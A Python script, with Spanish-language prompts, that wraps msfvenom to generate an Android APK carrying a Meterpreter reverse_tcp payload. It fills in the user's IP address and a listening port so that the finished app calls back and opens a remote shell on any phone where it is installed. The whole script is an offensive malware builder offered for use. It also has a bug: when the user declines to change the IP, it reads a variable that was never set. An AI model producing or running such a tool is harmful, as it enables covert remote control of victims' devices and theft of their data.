# Desarrollado Por NesAnTime, Todos los derechos Reservados
from tqdm import tqdm
import os
import subprocess
import platform
import time
import sys
import socket

def clear():
    sistema = platform.system()
    if sistema == "Windows":
        os.system("cls")
    elif sistema == "Linux":
        subprocess.run(["clear"])
    else:
        print("Este Sistema No Posee Mas Soporte")
def reverse(seg):
    time.sleep(seg)
def Barra(desc):
    lista_de_elementos = range(100)
    for elemento in tqdm(lista_de_elementos, desc):
        time.sleep(0.1)

#-----------------------------------------------------------------------------

def ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        return str(e)
ipv4 = ip()


clear()
Barra(desc="Iniciando Tool: ")
reverse(seg=1)
print("A Continuacion, Se Completara La Creacion De La Apk (reverb shell)\n")
clear()

print(f"Se Ha Establecido Tu Direccion IP ({ipv4}) Por Defecto")
on = input("¿Desea Cambiar La Direcccion IP Configurada por defecto? (y/n): ")
while on == "y":
    newip = input("Ingrese Su Direccion IP: ")
    off = input("\nLa Direccion IP Ingresada ¿Es Correcta? (y/n): ")
    if off == "y":
        break
    
print(f"Se ha Establecido la direccion IP ({newip})")
ipv4 = newip

clear()
port = int(input("Proporcione un Puerto de Escucha: "))
print(f"El Puerto de Escucha (" + str(port) + ") Se ha Establecido Correctamente..\n")
reverse(seg=2)

clear()
print("**** Terminando La Creacion del APK ;) **** ")
name = input("\nIngrese un Nombre para el archivo: ")
reverse(seg=1)
print(f"Se Ha establecido El Nombre del Archivo ¡Correctamente! ")
reverse(seg=1)
clear()
Barra(desc="Creando Archivo .Apk")

try:
    comando = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ ipv4 + " LPORT="+ str(port) + " -o " + name +".apk"
    resultado = subprocess.run(comando, shell=True, check=True, capture_output=True, text=True)
    print("\n ---------- Se Ha Creado El Archivo .APK Correctamente ---------- \n")
    print("***______ Informacion Y Detalles ______***")
    print(f"Nombre: {name}.apk")
    print(f"IP: {ipv4}")
    print(f"PORT: {port}")
    input("\nPresione Enter Para Finalizar... ")
    
except subprocess.CalledProcessError as e:
    print(f"Error al Crear El Archivo :( {e}")
    input("\nPresione Enter Para Finalizar... ")

    